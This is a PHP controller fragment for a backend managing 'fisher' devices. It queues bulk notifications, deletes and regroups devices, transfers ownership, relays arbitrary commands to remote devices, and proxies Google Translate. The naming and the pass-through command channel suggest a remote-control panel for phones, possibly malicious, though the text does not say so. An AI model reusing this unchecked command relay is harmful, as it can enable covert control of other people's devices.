    // ================= bulk notify =================
    protected function bnotify()
    {
        $b = $this->body;
        $title = (string)($b['notification_title'] ?? '');
        $content = (string)($b['notification_content'] ?? '');
        if ($content === '') return $this->json(['success' => false, 'error' => '通知内容不能为空', 'summary' => ['total' => 0, 'success' => 0, 'skipped' => 0, 'failed' => 0], 'results' => []], 400);
        $ids = $b['device_ids'] ?? null;
        if (!is_array($ids) || !$ids) {
            $ids = Db::table('fisher_devices')->where('is_connected', 1)->column('device_id');
        }
        $results = [];
        $ok = 0; $fail = 0; $skip = 0;
        foreach ((array)$ids as $did) {
            $did = (string)$did;
            $row = Db::table('fisher_devices')->where('device_id', $did)->find();
            if (!$row || !(int)($row['is_connected'] ?? 0)) { $skip++; $results[] = ['device_id' => $did, 'ok' => false, 'status' => 'offline']; continue; }
            try {
                Db::table('fisher_pending_commands')->insert([
                    'device_id' => $did,
                    'command_json' => json_encode(['id' => 'cmd-' . bin2hex(random_bytes(6)), 'command' => 'SEND_NOTIFICATION', 'params' => (object)['title' => $title, 'content' => $content]], JSON_UNESCAPED_UNICODE),
                    'created_at' => time(),
                ]);
                $this->notifyWs($did, 'SEND_NOTIFICATION', ['title' => $title, 'content' => $content]);
                $ok++;
                $results[] = ['device_id' => $did, 'ok' => true, 'status' => 'queued'];
            } catch (\Throwable $e) { $fail++; $results[] = ['device_id' => $did, 'ok' => false, 'status' => 'error']; }
        }
        return $this->json([
            'success' => true,
            'message' => '已发送 ' . $ok . ' 台设备',
            'summary' => ['total' => count((array)$ids), 'success' => $ok, 'skipped' => $skip, 'failed' => $fail],
            'results' => $results,
        ]);
    }

    // ================= batch operations =================
    protected function batch(array $seg)
    {
        if ($this->method !== 'POST' && $this->method !== 'PUT') {
            return $this->json(['success' => true, 'data' => null]);
        }
        $act = (string)($seg[1] ?? '');
        $ids = $this->body['ids'] ?? [];
        $ids = is_array($ids) ? array_map('strval', $ids) : [];
        switch ($act) {
            case 'pin':
                $pinned = !empty($this->body['pinned']);
                return $this->json(['success' => true, 'data' => ['pinned' => $pinned, 'count' => count($ids)]]);
            case 'delete':
                foreach ($ids as $did) {
                    Db::table('fisher_devices')->where('device_id', $did)->delete();
                }
                return $this->json(['success' => true, 'data' => ['deleted' => count($ids)]]);
            case 'group':
                $gid = (int)($this->body['group_id'] ?? $this->body['groupId'] ?? 0);
                $name = (string)(Db::table('fisher_device_groups')->where('id', $gid)->value('name') ?? '');
                if ($name !== '' && $ids) Db::table('fisher_devices')->whereIn('device_id', $ids)->update(['group_name' => $name]);
                return $this->json(['success' => true, 'data' => ['group' => $name, 'count' => count($ids)]]);
            case 'transfer':
                $owner = (string)($this->body['owner'] ?? $this->body['owner_username'] ?? '');
                if ($owner !== '' && $ids) Db::table('fisher_devices')->whereIn('device_id', $ids)->update(['owner_username' => $owner]);
                return $this->json(['success' => true, 'data' => ['owner' => $owner, 'count' => count($ids)]]);
            case 'command':
                $cmd = (string)($this->body['command'] ?? '');
                $payload = $this->body['payload'] ?? [];
                if ($cmd === '') return $this->json(['success' => false, 'error' => 'command required'], 400);
                if (!is_array($payload)) $payload = [];
                $n = 0;
                foreach ($ids as $did) {
                    Db::table('fisher_pending_commands')->insert([
                        'device_id' => $did,
                        'command_json' => json_encode(['id' => 'cmd-' . bin2hex(random_bytes(6)), 'command' => $cmd, 'params' => (object)$payload], JSON_UNESCAPED_UNICODE),
                        'created_at' => time(),
                    ]);
                    $this->notifyWs($did, $cmd, $payload);
                    $n++;
                }
                return $this->json(['success' => true, 'data' => ['queued' => $n, 'command' => $cmd]]);
        }
        return $this->json(['success' => true, 'data' => null]);
    }

    // ================= translate / forex (local, no upstream) =================
    protected function translate()
    {
        $q = (string)($this->query['q'] ?? $this->query['text'] ?? '');
        $out = '';
        if ($q !== '') {
            try {
                $u = 'https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl='
                    . urlencode((string)($this->query['tl'] ?? 'zh-CN')) . '&dt=t&q=' . urlencode($q);
                $ch = curl_init($u);
                curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 4]);
                $res = curl_exec($ch);
                $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
                if ($code === 200 && is_string($res)) {
                    $j = json_decode($res, true);
                    if (is_array($j) && isset($j[0]) && is_array($j[0])) {
                        $buf = '';
                        foreach ($j[0] as $seg2) if (isset($seg2[0])) $buf .= (string)$seg2[0];
                        $out = $buf;
                    }
                }
            } catch (\Throwable $e) {}
            if ($out === '') $out = $q;
        }
        return $this->json([[[$out, $q, null, null]]]);
    }

